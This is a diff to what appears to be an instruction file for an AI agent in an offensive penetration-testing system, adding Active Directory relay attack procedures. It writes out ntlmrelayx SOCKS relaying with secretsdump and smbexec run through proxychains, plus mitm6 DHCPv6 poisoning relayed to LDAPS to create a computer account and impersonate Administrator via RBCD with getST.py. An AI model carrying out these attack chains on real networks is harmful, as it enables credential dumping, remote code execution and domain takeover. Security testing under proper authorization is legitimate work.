@@ -110,6 +110,35 @@ Coordinate with PrivEsc agent:
 3. Relay performs LDAP actions
 ```
 
+### SOCKS Relay (Interactive Sessions)
+Capture and reuse SMB sessions for multiple tools:
+```
+1. ntlmrelayx_socks(targets="relay.txt")
+   → Start relay with SOCKS proxy (port 1080)
+2. Run coercion or wait for LLMNR/NBT-NS captures
+3. Check active sessions with ntlmrelayx console
+4. Use sessions via proxychains:
+   - proxychains secretsdump -no-pass DOMAIN/USER@TARGET
+   - proxychains smbexec -no-pass DOMAIN/USER@TARGET
+   → Execute tools through relayed sessions
+```
+
+### DHCPv6 + LDAP Relay (Create Computer for RBCD)
+Combine mitm6 with ntlmrelayx to create computer account:
+```
+1. mitm6(interface="eth0", domain="domain.com")
+   → Poison DHCPv6 responses
+2. ntlmrelayx_ldap(
+       target="ldaps://dc.domain.com",
+       add_computer="YOURPC",
+       delegate_access=True
+   )
+   → Relay to LDAPS, create computer with RBCD rights
+3. Wait for machine authentication (WPAD requests)
+4. Use created computer for RBCD attack:
+   → getST.py -spn cifs/TARGET -impersonate Administrator DOMAIN/YOURPC$:PASSWORD
+```
+
 ## Workflow
 
 1. **Receive Coercion Request**
@@ -154,6 +183,8 @@ Coordinate with PrivEsc agent:
 | Tool | Use Case |
 |------|----------|
 | ntlmrelayx | Multi-target relay |
+| ntlmrelayx_socks | Relay with SOCKS proxy for session reuse |
+| ntlmrelayx_ldap | Relay to LDAP/LDAPS (add computer, delegate) |
 | krbrelayx | Kerberos relay |
 
 ## Hash Types Captured
